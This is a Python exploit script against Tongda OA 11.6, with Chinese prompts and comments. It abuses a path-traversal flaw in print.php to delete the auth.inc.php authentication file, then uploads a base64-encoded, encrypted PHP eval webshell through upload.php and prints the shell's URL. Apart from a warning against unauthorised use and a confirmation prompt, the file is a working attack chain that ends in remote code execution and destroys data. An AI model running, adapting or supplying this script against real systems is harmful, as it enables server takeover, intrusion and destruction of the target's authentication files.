import requests
import time
import sys
import base64

def Start_delete_file(host): # 开始11.6任意文件删除 有风险勿在未授权使用 仅限V11.6
    print('[->] 开始测试通达11.6任意文件删除漏洞')
    time.sleep(1)
    print('[->] 正在删除认证文件 auth.inc.php')
    url = host + "module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"
    try:
        response = requests.get(url=url,timeout=2)
        # print(response.text)
        if response.status_code==200:
            print("[*] 删除成功，正在尝试上传getshell中...")
            file_upload(host)
        else:
            print("[-] 不存在该漏洞")
    except:
        pass

def file_upload(target_url): # 11.6后台上传getshell
    print('[->] 正在尝试后台上传getshell')
    url = target_url + 'general/data_center/utils/upload.php?action=upload&filetype=test&repkid=/.<>./.<>./.<>./'
    payload_php = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0iMTExMTExLmxvZyIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOyBzZXNzaW9uX3N0YXJ0KCk7CiAgICAka2V5PSJlNDVlMzI5ZmViNWQ5MjViIjsKCSRfU0VTU0lPTlsnayddPSRrZXk7CglzZXNzaW9uX3dyaXRlX2Nsb3NlKCk7CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCdvcGVuc3NsJykpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoJ3wnLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319CiAgICBAY2FsbF91c2VyX2Z1bmMobmV3IEMoKSwkcGFyYW1zKTsKPz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=")
    files = {'FILE1':('t3st.php',payload_php)}
    try:
        response = requests.post(url=url,files=files,timeout=2)
        # print(response.text)
        if response.status_code == 200:
            url_webshell = target_url + '_t3st.php'
            print('[*] webshell地址为:' + url_webshell)
        else:
            print("[-] 不存在该漏洞")
    except:
        pass

def run(host):
    flag = int(input('[!] 该操作存在风险，如确定执行请输入1：'))
    if flag != 1:
        print('[!] 程序正在退出，请稍后...')
        sys.exit()
    else:
        Start_delete_file(host)

if __name__ == '__main__':
    print('[->] 正在测试通达11.6任意文件删除漏洞（仅限11.6）')
    host = input("请输入目标URL地址：")
    run(host)